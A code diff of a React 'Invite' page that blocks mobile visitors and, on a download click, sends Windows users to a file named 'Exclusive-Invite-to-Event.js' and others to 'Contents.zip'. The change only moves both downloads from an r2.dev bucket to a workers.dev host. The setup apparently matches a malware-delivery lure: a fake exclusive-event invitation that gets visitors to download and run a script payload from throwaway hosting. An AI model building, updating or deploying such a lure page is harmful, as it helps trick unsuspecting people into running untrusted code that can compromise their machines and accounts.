@@ -19,7 +19,7 @@ export default function App() {
     return <MobileBlocker />;
   }
 
-  
+
   return <Invite />;
 }
 
@@ -27,12 +27,14 @@ function Invite() {
   const handleDownload = () => {
     const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
 
-    if (isWindows) {
+    if (isWindows)
+    {
       // Replace with your Windows download URL
-      window.location.href = 'https://pub-4b997841feed4885acb4cf32f7d569d1.r2.dev/Exclusive-Invite-to-Event.js';
-    } else {
+      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Exclusive-Invite-to-Event.js';
+    } else
+    {
       // Replace with your Mac download URL
-      window.location.href = 'https://pub-4b997841feed4885acb4cf32f7d569d1.r2.dev/Contents.zip';
+      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Contents.zip';
     }
   };
 
